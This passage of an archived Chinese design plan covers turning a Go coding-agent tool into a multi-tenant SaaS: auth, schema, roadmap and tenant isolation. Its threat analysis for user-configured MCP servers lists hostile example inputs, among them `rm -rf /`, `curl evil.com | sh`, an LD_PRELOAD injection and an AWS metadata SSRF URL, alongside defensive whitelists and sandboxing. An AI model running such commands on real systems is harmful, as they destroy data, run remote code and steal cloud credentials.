# Code-Agent SaaS 化升级方案（单用户 → 多租户）【历史归档】

> ⚠️ **方向已调整（2026-08-21）**：本项目已明确为 **toC（面向个人用户，无企业/组织/多租户概念）**，账号体系已落地为「邮箱 + 密码 + JWT」，数据统一按 `user_id` 隔离。下文"多租户 SaaS"规划**不再适用**，仅作为历史工程参考保留。
>
> 👉 **最新路线图与后续工作规划见 [`docs/roadmap.md`](docs/roadmap.md)**（toC 产品化与能力升级）。
>
> **状态**：规划稿（v0.1，部分内容已随 toC 改造失效）
> **原范围**：把 `d:/project_go/code-agent` 从"单用户工具"升级为"可上线、多租户、TUI+Web 双前端" SaaS
> **目标读者**：项目 owner / 后续接手者 / 面试官
> **核心约束**：DDD 架构不破坏、TUI 不存第三方 LLM 密钥、Agent 核心逻辑 80% 复用、尽量用成熟开源组件替代重复造轮子

---

## 0. 阅读须知

- **基线**：项目当前是单用户/单实例 Go 工具，dev-key 静态认证、CLI 直连、LLM 全局共享一个 key
- **升级方向**：在 `Auth()` 与 `ChatApp()` 之间插入 **Auth Gateway + Tenant Context + Per-User Service Factory** 三层，并补 Web SPA、TUI login、Qdrant 向量库、设备授权等关键能力
- **原则**：
  1. **复用优先**：现有 163 个 .go 文件中 ~80% 不动，只改 caller 加 ctx.user_id
  2. **接口先行**：每接入一个新能力先在 `domain/*/adapter/port/` 定义接口，再写 infrastructure 实现
  3. **能开源就开源**：fosite 做 OAuth2 / bubbletea 做 TUI / shadcn 做 UI / Qdrant 做向量——不重复造轮子
  4. **灰度优先**：Auth 一刀切到 JWT，dev-key 不留兜底（已确认）
  5. **DDD 边界严格**：domain 不知道 MySQL/Redis/Qdrant/OAuth 的存在；触发条件：禁止 `domain import infrastructure`、`domain import go.opentelemetry.io`、`domain import go-*`（除 `go-crypto` 等标准库）

---

## 1. 现状盘点（升级前的真问题）

### 1.1 能复用 ≈80%（业务层基本不动）
| 模块 | 文件 | 复用度 | 备注 |
|---|---|---|---|
| Agent 编排 | `internal/domain/agent/engine/`、`internal/infrastructure/einoorch/` | 直接复用 | 多租户只是 caller 多带 `user_id` |
| MCP 客户端/重连 | `internal/infrastructure/mcp/` | **小改（per-user 化）** | ⚠️ Manager 当前是全局单例 + 接口无 userID，Sprint 1.6 必须同步改 per-user 实例（见 §1.2.11） |
| 记忆服务 | `internal/domain/memory/` | 直接复用 | `user_id` 字段 schema 已存在，仅加外键 |
| 安全网关 | `internal/domain/security/` | 直接复用 | `Guard` 函数式包装，per-user 注入 |
| SSH pool | `internal/infrastructure/ssh/` | 小改 | `user_id` 字段已有；**密码明文必修（见 1.2.2）** |
| 工具注册表 | `internal/domain/tool/coding/` | 直接复用 | 工具代码无用户概念 |
| HTTP/SSE server | `internal/trigger/http/server.go` | 直接复用 | 中间件加 JWT 校验 |
| MinIO/Blob | `internal/domain/blob/` | 直接复用 | user_id 前缀天然隔离 |
| Redis 限流 | `internal/infrastructure/redisx/` | 直接复用 | key 前缀加 user_id |
| Skill/Slash/Intent | 各 domain | 直接复用 | 业务无关 |
| Compressor/摘要 | `internal/domain/contextx/` | 直接复用 | 离线 LLM 仍按 session |
| OTel/可观测 | `internal/observability/` | 直接复用 | 加 user_id/org_id 标签 |

### 1.2 必须新做（关键层，但占比 ≤20%）

#### 1.2.1 没有"用户"概念
- `Auth()` 只认静态 dev-key（`internal/application/chat_app.go:189` `if a.keys.Empty() { return true }` —— 无 key 全开放）
- `user_id` 字段是**客户端自报字符串**（`cmd/cli/main.go:25` 默认 `"cli-user"`，后端零信任）
- `CreateSession(userID, ...)` 自动把 `""` 降级为 `"anonymous"`
- 后果：现状等于**单用户演示模式**，不能上公网

#### 1.2.2 SSH 凭据明文存 DB（高危）
- `scripts/sql/01_schema.sql:145-146` `password VARCHAR(512)` / `private_key TEXT` 均无加密
- `internal/infrastructure/ssh/repo_mysql.go:18-24` / `repo_sqlite.go:17-24` 直接明文写入
- **SaaS 化必须同步修**：用 AES-GCM + KMS-wrapped master key

#### 1.2.3 全局共享 LLM Key
- `configs/config.yaml:22` 一个 api_key 服务所有用户；TUI 端无 key 但概念上没有"用户的 key"
- SaaS 必须改：**每个用户自己输 key、后端代理调用、TUI 端不落任何供应商 key**

#### 1.2.4 全局共享 MCP 配置
- `mcp_server_config` 是单库表，未带 `user_id`，所有用户看到同一组 MCP
- 必须改：**每用户独立的 MCP 配置**，按 `user_id` 隔离

#### 1.2.5 Token 配额形同虚设
- `TokenQuotaConfig.Enabled + PerUserPerDay` 存在但代码里只有 `IncrBy` 累加，从不校验超限
- 必须改：**实际校验超限拒绝**

#### 1.2.6 embedding 存 JSON 字符串 + 全表扫描
- `core_memory.embedding MEDIUMTEXT` JSON 序列化 float32
- `CosineSimilarity` 全量比对，**O(N) 单 user**、**O(N²) 多用户并发**
- 多租户必须接 **Qdrant**（已确认）

#### 1.2.7 无 OAuth/JWT/Device Flow
- 当前只有静态 API Key + bcrypt-like SHA-256 比对
- 必须改：**OAuth2 + RFC8628 设备授权 + JWT**

#### 1.2.8 无 Web 管理面板
- 当前前端资产 = 0
- 必须做：**Vite + React + shadcn/ui 自写 SPA（6 页）**

#### 1.2.9 无设备管理
- 没有 `device_id` / 设备撤销概念
- 必须做：`devices` 表 + TUI 自动注册设备 + Web 端可视化吊销

#### 1.2.10 TUI 是"裸"CLI
- `cmd/cli/main.go` 当前是 `bufio.Scanner` 简单 REPL
- 必须改：**bubbletea 重写**，支持 login 流程展示设备码

#### 1.2.11 🔴 MCP Manager 是全局单例、接口无 userID（**Sprint 1.6 必须同步改**）
- 现状：`internal/infrastructure/mcp/manager.go:63 NewManager()` 无 userID 参数；`internal/domain/mcp/adapter/port/mcp_port.go:23 IMCPManagerPort` 接口 `AddOrUpdate/Remove/ListTools/CallTool/Health/IsOnline` 全无 userID
- 后果：多租户下 MCP Manager 是**全局共享**——用户 A 和 B 看到同一组 MCP server、调同一组工具、用同一组凭据（这是 P0 级越权）
- 改造：① `IMCPManagerPort` 接口加 `SetUserID(userID string)` 或改用工厂方法 `NewManager(userID)`；② `Manager.clients` map 从 `map[serverName]IMCPClient` 改为 `map[userID]map[serverName]IMCPClient`；③ Factory 缓存 `userID → *Manager`；④ 看门狗拆 per-user 启动；⑤ 与 §8.5 runtime assertion 联动：每次调用断言 `Manager.userID == ctx.UserID` 否则 panic
- 估时：原 Sprint 1.6 "2.0 d" 需调整为 **2.5 d**（多 0.5 d 给 MCP per-user 化）

#### 1.2.12 🔴 用户 MCP 配置：SaaS 等于开后门（**Sprint 2.5 必须同步防护**）
- 现状：`internal/trigger/http/server.go:442-515` 的 `/api/v1/mcp/servers` 已是 CRUD API，但只查全局 `s.app.MCP()`，无 user 隔离
- 后果：SaaS 让用户在 Web 配 stdio MCP server，相当于**给每个用户开了"在宿主机以 Agent 权限跑任意子进程 + 接任意内网"的口子**——比 SSH 明文凭据还危险（凭据至少还要解加密，stdio 直接执行）
- 风险细化：
  - `command: "rm -rf /"`、`command: "bash -c 'curl evil.com | sh'"` 任意执行
  - `env: {LD_PRELOAD: "/tmp/evil.so"}` 注入动态库
  - `url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` AWS metadata SSRF
  - `args: ["-y", "any-npm-package"]` npx 拉恶意包
- 防护（4 层，Sprint 2.5 落地，详见 §8.7）：
  1. **command 白名单**：`uvx`/`npx`/`docker`/`mcp-server-*` 前缀；不在白名单 409
  2. **env 变量名白名单**：只接受 `*_TOKEN` / `*_KEY` / `*_URL` / 已知 provider 名；其余 409
  3. **SSRF 防护**：URL 校验禁内网 IP（10/172.16/192.168/169.254/127.x）+ DNS 解析后再次校验
  4. **stdio 进程沙箱**：复用 §1.4 bash 沙箱 —— `unshare -U -r` namespace、`--pids-limit 64`、磁盘只读 mount workspace、网络默认 deny
- 估时：Sprint 2.5 由 1.5 d → **2.5 d**（+1.0 d 给用户 MCP 安全 4 层防护）

---

## 2. 目标架构

```
┌────────────────────┐  ┌────────────────────┐
│ TUI Client │  │ Web Admin SPA      │
│ (bubbletea/Go)     │  │ (Vite+React+shadcn) │
│ - 显示 device code │  │ - 账号/LLM Key/    │
│ - 浏览器跳转       │  │   Agent 参数/ │
│ - 长轮询 token     │  │   MCP 开关/        │
│ - SSE 消费流 │  │   设备吊销/        │
└─────────┬──────────┘  └─────────┬──────────┘
          │ Bearer JWT (短) + refresh_token
          │ 只存 ~/.code-agent/token, 700 权限
          ▼                       ▼
┌──────────────────────────────────────────────┐
│ Backend (Go, 单进程, 多模块)                   │
│                                              │
│ ┌──────────────┐   ┌──────────────────────┐  │
│ │ Auth Gateway │ → │ OAuth2 + Device Flow │  │
│ │ (JWT verify) │   │  /oauth/device/code  │  │
│ │  每请求1 次 │   │  /oauth/device/verify│  │
│ │              │   │  /oauth/token        │  │
│ └──────────────┘   │  /oauth/userinfo │  │
│ │          └──────────────────────┘  │
│         │注入 ctx: user_id, org_id,         │
│         │ device_id, scopes │
│         ▼ │
│ ┌────────────────────────────────────────┐   │
│ │ Per-User Service Factory │   │
│ │  user_id → *mcp.Manager                │   │
│ │         → *memory.Service              │   │
│ │         → *ssh.Pool                    │   │
│ │         → *engine.TokenManager         │   │
│ │         → LLMClient (per-user key)     │   │
│ │ 内存缓存 + 主动失效（写时） │   │
│ └────────────────────────────────────────┘   │
│ │
│ ┌────────────────────────────────────────┐   │
│ │ 复用现有80%                            │   │
│ │  ChatApp / Session / Audit / Compressor │   │
│ │  Intent / Skill / Tool / Blob / Skill │   │
│ └────────────────────────────────────────┘   │
│                                              │
│ ┌────────────────────────────────────────┐   │
│ │ LLM 代理层（关键：第三方 key 全在这里）  │   │
│ │  chat_completions 流式转发              │   │
│ │  重试/熔断/限流/计量 │   │
│ └────────────────────────────────────────┘   │
└──────────────────────────────────────────────┘
         │
         ▼
   MySQL / Redis / MinIO / Qdrant / OTel Collector
```

---

## 3. 引入的开源依赖（少造轮子）

| 类别 | 选型 | 理由 / 替代 |
|---|---|---|
| **OAuth2 / Device Flow** | `ory/fosite` v0.49+ | 标准 OAuth2 服务端库，开箱提供 `DeviceFlowHandler`（RFC8628），比自写安全 |
| **JWT 签发/解析** | `golang-jwt/jwt/v5` | 行业标准，HMAC/RSA/EdDSA |
| **密码哈希** | `golang.org/x/crypto/bcrypt` | Go 官方推荐，零新依赖 |
| **TUI 框架** | `charmbracelet/bubbletea` + `lipgloss` + `bubbles` | 终端 SSO 展示设备码/进度最成熟；Elm 架构交互清晰 |
| **向量库** | **Qdrant** v1.12+（`qdrant/qdrant` 镜像 + `github.com/qdrant/go-client`） | 单二进制、Go 客户端一流、payload 过滤强 |
| **MCP 客户端 SDK**（评估中） | **暂用手搓 JSON-RPC**（Sprint 4.8 评估切换） | `mark3labs/mcp-go` / `metoro-io/mcp-golang` | 当前只消费 4 RPC 不值当背 SDK 依赖；Sprint 1-3 专注多租户不背换 SDK 风险；**留 Sprint 4.8 做"二选一"评估** |
| **KMS（凭据加密）** | `google/tink` + 本地 master keyfile | 抽象层好，可后续接 Vault/AWS KMS |
| **加密原语** | `crypto/aes` + `crypto/cipher` | 标准库 |
| **邮箱** | `wneessen/go-mail` | 发验证邮件；生产换 SES |
| **定时清理** | `robfig/cron/v3` | 清理过期 device/token/log |
| **限流** | 现有 `internal/infrastructure/redisx/` | 不引入新依赖 |
| **Web 构建** | Vite + React 18 + TypeScript | 速度最快、配置最简 |
| **Web UI** | `shadcn/ui`（Radix + Tailwind） | copy-paste 可控、面试官认可 |
| **数据请求** | `@tanstack/react-query` | 缓存/失效/重试开箱 |
| **HTTP 客户端** | axios（拦截器做 JWT 刷新） | 或 fetch + 手写 |
| **路由** | `react-router-dom` v6 | 标准 |
| **表单** | `react-hook-form` + `zod` | 管理面板表单密集 |
| **集成测试** | `testcontainers/testcontainers-go` + 前端 `msw` | MySQL/Redis/MinIO/Qdrant 容器化测 |

**新依赖总量**：4 个 Go 库（fosite、golang-jwt、bubbletea、go-client）+ 10 个 npm 包

---

## 4. 新增数据模型（5 张表 + 外键迁移）

```sql
-- 1. 组织
CREATE TABLE organizations (
  id                CHAR(26) PRIMARY KEY,                  -- ULID
  name              VARCHAR(128) NOT NULL,
  plan              VARCHAR(16) NOT NULL DEFAULT 'free',  -- free|pro|team
  daily_token_quota INT NOT NULL DEFAULT 500000,
  created_at        DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3)
);

-- 2. 用户
CREATE TABLE users (
  id              CHAR(26) PRIMARY KEY,
  email           VARCHAR(255) UNIQUE NOT NULL,
  password_hash   VARCHAR(255) NOT NULL,                  -- bcrypt cost=12
  display_name    VARCHAR(64) NOT NULL DEFAULT '',
  org_id          CHAR(26) NOT NULL,
  status          VARCHAR(16) NOT NULL DEFAULT 'active',  -- active|suspended|deleted
  email_verified  BOOLEAN NOT NULL DEFAULT FALSE,
  created_at      DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3),
  updated_at      DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) ON UPDATE CURRENT_TIMESTAMP(3),
  KEY idx_users_org (org_id, status),
  CONSTRAINT fk_users_org FOREIGN KEY (org_id) REFERENCES organizations(id)
);

-- 3. 登录设备
CREATE TABLE devices (
  id              CHAR(26) PRIMARY KEY,                  -- 设备 UUID，存 ~/.code-agent/device_id
  user_id         CHAR(26) NOT NULL,
  device_name     VARCHAR(64) NOT NULL,                  -- 用户起名 "MBP-14"
  platform        VARCHAR(16) NOT NULL,                  -- linux|darwin|windows
  user_agent      VARCHAR(255) NOT NULL DEFAULT '',
  last_seen_at    DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3),
  last_ip         VARCHAR(45) NOT NULL DEFAULT '',
  revoked_at      DATETIME(3) NULL,
  created_at      DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3),
  KEY idx_devices_user (user_id, revoked_at),
  CONSTRAINT fk_devices_user FOREIGN KEY (user_id) REFERENCES users(id)
);

-- 4. per-user LLM key (加密存储)
CREATE TABLE user_llm_keys (
  id              CHAR(26) PRIMARY KEY,
  user_id         CHAR(26) NOT NULL,
  provider        VARCHAR(32) NOT NULL,                  -- openai|anthropic|azure|...
  alias           VARCHAR(64) NOT NULL,                  -- "work-openai"
  api_key_cipher  VARBINARY(1024) NOT NULL,              -- AES-GCM(plaintext)
  api_base        VARCHAR(255) NOT NULL DEFAULT '',
  enabled         BOOLEAN NOT NULL DEFAULT TRUE,
  last_used_at    DATETIME(3) NULL,
  created_at      DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3),
  KEY idx_userllm_user (user_id, enabled),
  CONSTRAINT fk_userllm_user FOREIGN KEY (user_id) REFERENCES users(id)
);

-- 5. per-user MCP 配置 (JSON 存)
CREATE TABLE user_mcp_servers (
  id              CHAR(26) PRIMARY KEY,
  user_id         CHAR(26) NOT NULL,
  name            VARCHAR(64) NOT NULL,
  transport       VARCHAR(16) NOT NULL,                  -- stdio|sse|http
  config_json     JSON NOT NULL,                         -- {command, args, env, url, headers...}
  enabled         BOOLEAN NOT NULL DEFAULT TRUE,
  created_at      DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3),
  updated_at      DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) ON UPDATE CURRENT_TIMESTAMP(3),
  UNIQUE KEY uk_user_mcp (user_id, name),
  CONSTRAINT fk_usermcp_user FOREIGN KEY (user_id) REFERENCES users(id)
);

-- 6. per-user Agent 参数
CREATE TABLE user_agent_configs (
  user_id         CHAR(26) PRIMARY KEY,
  config_json     JSON NOT NULL,
  updated_at      DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) ON UPDATE CURRENT_TIMESTAMP(3),
  CONSTRAINT fk_useragent_user FOREIGN KEY (user_id) REFERENCES users(id)
);

-- 7. 团队成员表（MVP 阶段空表，forward-compat）
CREATE TABLE org_members (
  id              CHAR(26) PRIMARY KEY,
  org_id          CHAR(26) NOT NULL,
  user_id         CHAR(26) NOT NULL,
  role            VARCHAR(16) NOT NULL DEFAULT 'member',  -- owner|admin|member
  joined_at       DATETIME(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3),
  UNIQUE KEY uk_org_user (org_id, user_id),
  KEY idx_orgmembers_user (user_id),
  CONSTRAINT fk_orgmembers_org  FOREIGN KEY (org_id)  REFERENCES organizations(id),
  CONSTRAINT fk_orgmembers_user FOREIGN KEY (user_id) REFERENCES users(id)
);
```

**forward-compat 说明（Org × User 边界）**：
- MVP 阶段 `users.org_id` 是"主归属组织"，单 user 单 org；`org_members` 表**建空表不用**
- 未来启用团队邀请时：
  1. 数据迁移：`INSERT INTO org_members(org_id, user_id, role='owner') SELECT org_id, id, 'owner' FROM users`（把现有归属转成 owner 角色）
  2. Schema 切换：`users.org_id` 改为 nullable；新增 `user_active_org_id`（用户当前活跃组织，默认等于 owner org）
  3. 业务改造：`GetUserOrg(ctx, userID, activeOrgID)`；JWT 内增 `active_org_id` claim；MCP/Memory/SSH 按 `active_org_id` 而非 `user_id` 隔离资源
  4. **今天**已建空表，未来切换只是数据迁移 +1 字段变更，**无 schema 大改**

**迁移外键**（已有表）：
- `chat_session.user_id → users.id`
- `core_memory.user_id → users.id`
- `audit_log.user_id → users.id`
- `session_summary.user_id → users.id`（新增 session_summary.user_id 字段）
- `ssh_connection.user_id → users.id`（已有字段但无外键）
- `mcp_server_config`（全局配置表）→ 改为只存平台级默认配置，用户级迁到 `user_mcp_servers`

**现有数据**：dev-key 测试产生的会话/记忆标 `user_id="legacy-dev"`，前端不展示，3 个月后清理脚本删除。

---

## 5. Auth 流程（RFC8628 设备授权 + JWT）

### 5.1 TUI 登录流程
```
1. 用户在终端执行：code-agent login
2. TUI → POST /oauth/device/code
   req:  {client_id: "code-agent-cli", scope: "chat:run mcp:read devices:manage"}
   resp: {
     device_code: "abc123...",         ← 内部轮询凭证，存 Redis 5min
     user_code: "ABCD-1234",          ← 显示给用户，URL-safe base32
     verification_uri: "https://app.example.com/devices/verify",
     verification_uri_complete: ".../devices/verify?code=ABCD-1234",
     expires_in: 300,
     interval: 5
   }
3. TUI 显示设备码 + 自动打开 verification_uri_complete
4. 用户在网页：登录 → 输入 user_code → 确认授权
5. 后端：device_codes.user_code 标记为 approved = (user_id)
6. TUI 轮询 POST /oauth/token
   resp: {
     access_token: "eyJ...",          ← 15min TTL
     refresh_token: "dGhpc...",        ← 7day TTL
     token_type: "Bearer",
     scope: "chat:run mcp:read ..."
   }
7. TUI 写 ~/.code-agent/token (chmod 700)
8. 后续所有请求：Authorization: Bearer <access_token>
   access_token 过期前 1min 自动 refresh
```

### 5.2 安全点
- `user_code` 长度 8 字符 base32（≈ 40 bit），5 分钟过期 + 最多 5 次输错锁定
- `device_code` 不暴露给前端
- `access_token` JWT 内含 `jti`（防重放）+ `user_id` + `org_id` + `scopes`
- `refresh_token` HMAC 签名（无状态）+ 单点撤销表（`revoked_refresh` Redis 集合）

---

## 6. 升级路线图（12 周 / 3 个月，秋招前冲刺）

### Sprint 1 (Week 1-3) — Auth + 多租户地基 + Qdrant
| # | 任务 | 估时 | 复用 / 新增 |
|---|---|---|---|
| 1.1 | users / organizations / devices / refresh_tokens 表 + 仓储 | 1.0 d | 现有 repo 模式 |
| 1.2 | 密码注册/登录 + bcrypt + 邮箱验证流程 | 0.5 d | 现有 redisx |
| 1.3 | JWT 签发/校验 + HMAC rotating refresh + 中间件 | 1.0 d | `golang-jwt/jwt/v5` |
| 1.4 | RFC8628 Device Flow 端点（基于 fosite） | 1.5 d | `ory/fosite` |
| 1.5 | 现有 dev-key **一步切 JWT**（无灰度） | 0.3 d | 删除 dev-key 兼容分支 |
| 1.6 | **ctx.tenant 改造 + MCP Manager per-user 化**（详见 §1.2.11、§8.5） | 2.5 d | 业务层 38 处 + MCP 接口改造 |
| 1.7 | 多租户隔离 audit 测试（保证越权读不到） | 0.5 d | 现有 audit repo |
| 1.8 | 加 `obs.UserID` / `OrgID` / `DeviceID` span 属性 | 0.3 d | OTel |
| 1.9 | **`IVectorIndex` 接口 + Qdrant 适配器 + `EnsureCollection`** | 1.0 d | `qdrant/go-client` |
| 1.10 | **`memory.Service.Search/FindDuplicate` 切 Qdrant-first + 失败 fallback** | 0.5 d | 复用旧路径 |
| 1.11 | **`BackfillVector` 启动时批量补缺失 embedding** | 0.5 d | 复用 `Backfill` 模式 |
| 1.12 | `docker-compose.yml` 加 Qdrant service + healthcheck + volume | 0.2 d | |
| | **Sprint 1 合计** | **9.3 d** | |

**交付物**：JWT 单轨可用、ctx 改造完成、Qdrant 接通并 fallback 验证、TUI 仍用旧 dev-key 路径但有 warning。

### Sprint 2 (Week 4-6) — Web 管理面板 + Per-User 配置
| # | 任务 | 估时 |
|---|---|---|
| 2.1 | Web SPA 骨架（Vite + React + shadcn + Tailwind + 路由 + auth） | 1.5 d |
| 2.2 | 账号管理页（注册/登录/忘记密码/邮箱验证） | 1.0 d |
| 2.3 | LLM Key 管理（CRUD + "测试连通" + **AES-GCM 加密存储**） | 1.5 d |
| 2.4 | Agent 参数面板（temperature / max_steps / stream / 工具分级） | 1.0 d |
| 2.5 | MCP 开关（CRUD + enable/disable + tool 列表预览 + **§8.7 四层安全防护**） | 2.5 d |
| 2.6 | 设备管理页（list + revoke + last_seen + 本机识别） | 0.5 d |
| 2.7 | 审计查询页（按时间/操作/工具过滤） | 0.5 d |
| 2.8 | KMS 集成（`google/tink` + 本地 master keyfile） | 0.5 d |
| 2.9 | **SSH 凭据同步接入 KMS**（复用 2.8 基础设施，避免 Sprint 3.6 才修的风险窗口） | 0.5 d |
| 2.10 | KMS 单元测试 + key 轮换演练 + 加密 SQL 加/解密 round-trip | 0.3 d |
| | **Sprint 2 合计** | **8.3 d** |

**交付物**：能在网页上配账号 + LLM Key + Agent 参数 + MCP 开关 + 吊销设备；**LLM Key 与 SSH 凭据均已加密，风险窗口闭合**。

### Sprint 3 (Week 7-9) — TUI 重写 + 后端 LLM 代理 + 凭据 KMS
| # | 任务 | 估时 |
|---|---|---|
| 3.1 | **后端 LLM 代理层**（per-user key 工厂 + 重试/熔断/限流/计量） | 1.5 d |
| 3.2 | TUI 改 bubbletea（保持 SSE 协议不变） | 2.0 d |
| 3.3 | TUI login 流程（device code 展示 + 浏览器跳转 + tick 轮询） | 1.5 d |
| 3.4 | 设备生成（`device_id` / `device_name` / `platform` / `user_agent` 持久化） | 0.5 d |
| 3.5 | 设备吊销 + 强制登出 + refresh token 撤销 | 0.5 d |
| 3.6 | per-user isolation 强 filter 注入 + lint/断言防越权（Qdrant、Memory、SSH 等所有读路径收口） | 0.5 d |
| 3.7 | TUI 凭据本地加密（`~/.code-agent/token` DPAPI/systemd-creds）+ 跨设备撤销广播 | 0.5 d |
| | **Sprint 3 合计** | **6.3 d** |

**交付物**：TUI 登录 → 浏览器授权 → 后端代理 LLM → 全链路通。**TUI 端无任何供应商 key 落地**。

### Sprint 4 (Week 10-12) — 加固 + 上线前
| # | 任务 | 估时 |
|---|---|---|
| 4.1 | 多租户隔离 e2e 测试（用户 A 越权读用户 B 数据必须 0 行） | 1.5 d |
| 4.2 | 多级限流（IP 级 + device 级 + user 级 + org 级） | 1.0 d |
| 4.3 | Prometheus + Grafana 看板 + 告警（5xx / token / error_rate / duration） | 1.0 d |
| 4.4 | Docker Compose 全栈编排（server / web / db / redis / minio / qdrant / otel） | 1.0 d |
| 4.5 | README + 部署文档 + 用户手册（截图/GIF） | 1.0 d |
| 4.6 | 上线前压测（k6） + OWASP top10 安全 checklist | 1.5 d |
| 4.7 | Qdrant e2e 越权测试（用户 A 拿不到 B 的任何 hit） | 0.5 d |
| 4.8 | **MCP SDK "二选一"评估**：若用户要求 resources/prompts/sampling/OAuth 等高阶能力 → 切 `mark3labs/mcp-go`；否则保留手搓 | 1.0 d |
| | **Sprint 4 合计** | **8.5 d** |

**交付物**：可上线、能演示、能面试讲。

### 总工作量
- **实际开发**：≈ **34.4 天**（v0.2=31.9 + Sprint 2.5 +1.0d 用户 MCP 安全防护 + Sprint 4 +1.5d Qdrant 越权测 + SDK 评估）
- **日历时间**：12 周（含学习/调试/排错/写文档）
- **复用率**：现有 163 个 .go 中 **~130 个原封不动**，只动 ctx + auth 网关 + 6 张新表 + 1 个新 web 包 + 1 个 TUI 重写 + Qdrant 接入 + MCP per-user 化
- **可分阶段交付**：每 Sprint 结束都有可演示物

---

## 7. 文件结构（升级后）

```
code-agent/
├── web/                          # 新增：Web SPA
│   ├── src/
│   │   ├── pages/                # 6 个页面
│   │   ├── components/           # shadcn copy-paste
│   │   ├── lib/api.ts            # axios + interceptor
│   │   ├── lib/auth.tsx          # Context + hooks
│   │   └── App.tsx
│   ├── vite.config.ts
│   ├── tailwind.config.js
│   └── package.json
├── cmd/
│   ├── server/                   # 后端入口（基本不变）
│   ├── cli/                      # TUI（bubbletea 重写）
│   └── host-agent/               # 不变
├── internal/
│   ├── auth/                     # 新增：OAuth2 + Device Flow + JWT
│   ├── kms/                      # 新增：AES-GCM / Tink 凭据加解密
│   ├── vector/                   # 新增：Qdrant 适配器（domain 叫 index）
│   ├── proxy/                    # 新增：后端 LLM 代理层
│   ├── ...（业务 80% 不变）
│   └── domain/
│       └── memory/adapter/port/  # 加 IVectorIndex 接口
├── configs/
│   └── config.yaml               # 加 vector.qdrant / auth.oauth2 / kms 配置
├── docs/
│   └── saas-roadmap.md           # 本文件
└── docker-compose.yml            # 加 qdrant / web 服务
```

---

## 8. 集成架构（关键子系统）

### 8.1 向量库（Qdrant）集成
- **抽象层**（domain 不感知 Qdrant）：
  ```go
  // internal/domain/memory/adapter/port/vector_index_port.go
  type IVectorIndex interface {
      EnsureCollection(ctx, name string, dim int) error
      Upsert(ctx, collection, id string, vector []float32, payload map[string]any) error
      Delete(ctx, collection, id string) error
      Search(ctx, collection string, vector []float32, filter map[string]any, limit int) ([]VectorHit, error)
  }
  type VectorHit struct {
      ID      string
      Score   float64
      Payload map[string]any
  }
  ```
- **数据流（双写 + 容错）**：
  ```
  Save(memory):
    1. embedder.Embed(content) → vector
    2. MySQL.Save(metadata) ← source of truth
    3. Qdrant.Upsert(vector + payload) ← 失败仅 log
    4. (异步) 失败任务入 retry queue，BackfillVector 周期补
  Search(query):
    1. embedder.Embed(query) → qvec
    2. 优先 Qdrant.Search(filter=user_id+scope+...) → top-K
    3. 失败/超时 fallback MySQL.List + 全量 CosineSimilarity
  FindDuplicate：
    1. Qdrant.Search(vector, filter=user_id, limit=5) → cosine
    2. >= 0.88 视为重复 → MySQL ID 做去重
    3. 失败 → 旧路径 MySQL.List
  ```
- **多租户隔离**：
  - **姿势 A（推荐）**：单 collection `code_agent_memories`，payload 必有 `user_id`
  - 所有 `Search` 前**断言** filter 含 `user_id`，缺失即 `panic`（lint + 双重保险）
  - e2e 测试：用户 A 取不到用户 B 任何 hit
- **Embedding 模型兼容**：
  - collection 命名 `memories_<model_short>_<dim>`（如 `memories_openai_3s_1536`）
  - 模型升级时建新 collection + 双写 + 灰度切流

### 8.2 Auth Gateway 中间件
```go
// internal/auth/middleware.go（伪代码）
func JWTAuth() gin.HandlerFunc {
    return func(c *gin.Context) {
        h := c.GetHeader("Authorization")
        if !strings.HasPrefix(h, "Bearer ") { abort401(c); return }
        token := strings.TrimPrefix(h, "Bearer ")
        claims, err := verifyJWT(token)
        if err != nil { abort401(c); return }
        ctx := context.WithValue(c.Request.Context(), CtxUserID, claims.UserID)
        ctx = context.WithValue(ctx, CtxOrgID, claims.OrgID)
        ctx = context.WithValue(ctx, CtxDeviceID, claims.DeviceID)
        c.Request = c.Request.WithContext(ctx)
        c.Next()
    }
}
```

### 8.3 Per-User Service Factory
```go
// internal/bootstrap/factory.go（伪代码）
type UserServices struct {
    Mem        *memory.Service
    MCP        *mcp.Manager
    SSH        *sshinfra.Pool
    LLMClient  *llm.OpenAIClient  // per-user key
    TokenMgr   *engine.TokenManager
}

var userServiceCache sync.Map  // userID → *UserServices

func (f *Factory) Get(ctx context.Context, userID string) (*UserServices, error) {
    if cached, ok := userServiceCache.Load(userID); ok { return cached.(*UserServices), nil }
    return f.buildAndCache(ctx, userID)
}
```

### 8.4 后端 LLM 代理层
- 入口：`internal/proxy/llm.go` 实现 `domain/agent/adapter/port/ILLMPort`
- 工厂：per-user 取 key → 拼 URL → OpenAI 兼容 client → 加 retry/breaker/限流/计量
- 流式：SSE 透传到前端
- 配额：调用前 `checkQuota(userID, estimateTokens)`；调用后 `incrToken(userID, realTokens)`

### 8.5 租户隔离守门人（静态 + 运行时双保险）

**问题**：仅靠"约定"和"测试"不够——Per-User Service Factory 缓存失效不全、某工具/Skill 内部绕过 Factory 直接拿全局资源，仍可能漏 user_id 过滤。

**解法**：三层防线，Sprint 1.6 / 1.7 落地。

#### 防线 1：静态 lint（grep + custom analyzer）
写一个 `tools/lint/tenant.go` 二进制，加入 CI：
```bash
# 1. 禁止 domain/infrastructure 层出现裸 "List()" / "GetAll()" / "Find()" 调用
#    （必须经过带 user_id 参数的 ListByUser / ListBySession 等）
grep -rn -E '\.List\(\s*\)|\.(GetAll|Find)\(\s*\)' internal/infrastructure/repository/ \
  | grep -v 'userID' | grep -v 'sessionID' | tee >(grep . > lint_fail.txt)

# 2. 禁止 SQL 字符串里出现无 WHERE 的 SELECT / UPDATE / DELETE
#    （自动扫 internal/infrastructure/repository/*.go，识别裸 query）
# 用 golangci-lint custom linter 实现，匹配 pattern：
#   `db\.QueryContext.*SELECT.*FROM.*(?!WHERE)` 等

# 3. 禁止直接 import 全局资源（mcp.Manager 单例 / ssh.Pool 全局）
#   检查 `import "github.com/.../infrastructure/mcp"` 不出现在 domain 层
```

#### 防线 2：运行时 assertion（Factory 入口断言）
```go
// internal/bootstrap/factory.go
